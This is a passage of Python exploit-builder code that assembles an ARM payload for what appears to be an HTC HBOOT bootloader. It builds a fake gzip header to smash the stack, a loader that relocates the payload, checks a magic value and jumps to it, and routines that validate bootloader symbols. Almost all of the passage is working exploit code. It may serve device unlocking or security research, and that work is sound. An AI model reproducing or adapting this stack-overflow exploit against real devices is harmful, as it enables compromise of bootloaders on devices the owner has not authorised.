        {asm.mov32("r0", str_info_validating_current_hboot)};
        {asm.call(context.functions["print"])};
        
        # Validate new bootloader symbols
        {asm.mov32("r0", consts.BL_LOAD_ADDRESS)};
        {asm.mov32("r1", consts.BL_LOAD_ADDRESS + consts.HBOOT_LENGTH)};
        {asm.call(context.functions["validate_hboot_symbols"])};
    
    CurrentHBOOTSymbolsOK:
        #We call the mode code for this payload
        {asm.call(context.functions["payload_mode"])}

    RebootRUU:
        {asm.call(context.functions["reboot_ruu"])};

    Reboot:
        {asm.call(context.functions["reboot"])};
        b    Reboot;
    """)["addr"] + 1

    # Write payload_data CRC and length and bundle vars
    payload = context.payload_data.finish()
    context.payload_vars.set_data(payload_checksum["offset"], struct.pack("<I", binascii.crc32(payload)))
    context.payload_vars.set_data(payload_checksum["offset"] + 4, struct.pack("<I", len(payload)))
    payload = context.payload_vars.finish() + payload

    # Setup loader that will relocate payload to safe area

    context.payload_exploit.store(bytes(consts.PAYLOAD_EXTRA_PADDING))

    #Add fake gz header
    gzip_header = generate_exploit_gz_header((stack_smash_count + 10) * 4, stack_target)
    gzip_header_addr = context.payload_exploit.store(gzip_header)["addr"]

    # Data to locate payload
    payload_prerelocation_info = context.payload_exploit.store(bytes(8))

    #Add the loader code, no context related stuff can be used here!
    loader_code = context.payload_exploit.store(asm.compile_arm(thumb=False, code = f"""
        {common_setup_code};
    
        # Prepare the relocator
        {asm.mov32("r0", consts.PAYLOAD_RELOCATED_ADDR)};
        {asm.mov32("r1", payload_prerelocation_info["addr"])};
        ldr  r2, [r1, #4];
        ldr  r1, [r1];
        mov  r3, #0;
    Copy:
        ldr  r4, [r1, r3];
        str  r4, [r0, r3];
        add  r3, #4;
        cmp  r3, r2;
        bls  Copy;
        
        #Barrier
        dsb  SY;
        isb  SY;

        #Check magic before jump
        {asm.mov32("r0", payload_addr)};
        {asm.mov32("r2", consts.PAYLOAD_MAGIC)};
        sub  r1, r0, #5;
        ldr  r1, [r1];
        cmp  r1, r2;
        bne  Reboot;
        
        #Valid, jump!
        blx  r0;
        
        #Just in case
        {reboot_code}
    """))
    if loader_code["len"] > consts.PAYLOAD_LOADER_RESERVED:
        raise ValueError(f"{loader_code["len"]} exceeds max loader code size")

    #Store the payload vars + data inside exploit payload
    payload_prerelocation = context.payload_exploit.store(payload)

    #Set the info so that relocator knows where is the payload
    context.payload_exploit.set_data(payload_prerelocation_info["offset"], struct.pack("<I", payload_prerelocation["addr"]))
    context.payload_exploit.set_data(payload_prerelocation_info["offset"] + 4, struct.pack("<I", payload_prerelocation["len"]))

    context.payload_exploit.store(bytes(consts.PAYLOAD_EXTRA_PADDING))

    return [
        context.payload_exploit.finish(),
        loader_code["addr"],
        gzip_header_addr
    ]